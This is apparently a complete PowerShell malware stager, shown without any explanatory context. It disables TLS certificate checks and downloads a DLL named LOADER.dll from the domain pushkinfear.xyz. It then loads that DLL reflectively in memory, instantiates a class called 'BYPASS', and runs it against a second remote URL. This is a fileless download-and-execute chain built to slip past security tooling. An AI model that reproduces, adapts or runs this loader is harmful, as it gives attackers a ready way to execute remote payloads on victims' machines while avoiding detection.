add-type @"
   using System.Net;
   using System.Security.Cryptography.X509Certificates;
   public class TrustAllCertsPolicy : ICertificatePolicy {
      public bool CheckValidationResult(
      ServicePoint srvPoint, X509Certificate certificate,
      WebRequest request, int certificateProblem) {
      return true;
   }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

[byte[]] $dll = new-object byte[] 102400;
$count = 0
$webreq = [System.Net.WebRequest]::Create("https://www.pushkinfear.xyz/full/LOADER.dll")
$resp=$webreq.GetResponse()
$respstream=$resp.GetResponseStream()
$stream = [System.IO.MemoryStream]::new()
while(($count = $respstream.Read($dll, 0, 10400)) -gt 0) 
{ 
    $stream.Write($dll, 0, $count);
    $stream.Flush()
}
$dll = $stream.ToArray()
$a=[System.Reflection.Assembly]::Load($dll).GetType("BYPASS");
$ac = [System.Activator]::CreateInstance($a);
$b=[System.Reflection.Assembly]::Load($dll).GetType("BYPASS").GetMethod("Run");
$b.Invoke($ac, "https://www.pushkinfear.xyz/full/a5fqpud3wb.06r");